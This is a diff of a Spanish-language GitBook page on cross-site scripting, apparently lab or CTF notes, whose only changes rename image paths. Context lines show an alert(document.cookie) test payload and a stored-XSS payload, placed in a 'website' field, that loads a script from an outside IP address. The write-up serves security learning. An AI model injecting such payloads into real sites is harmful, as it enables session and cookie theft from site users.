@@ -34,7 +34,7 @@ Muchas aplicaciones web modernas utilizan iFrames entre dominios para manejar la
 <script>alert(document.cookie)</script>
 ```
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Reflected XSS
 
@@ -243,7 +243,7 @@ En la página inicial identifiqué un campo de búsqueda y un enlace “Welcome 
 
 El campo **website** es vulnerable.
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Insertamos ese payload en el campo website.
 
@@ -251,4 +251,4 @@ Insertamos ese payload en el campo website.
 '><script src=http://10.10.15.62/script.js></script>
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
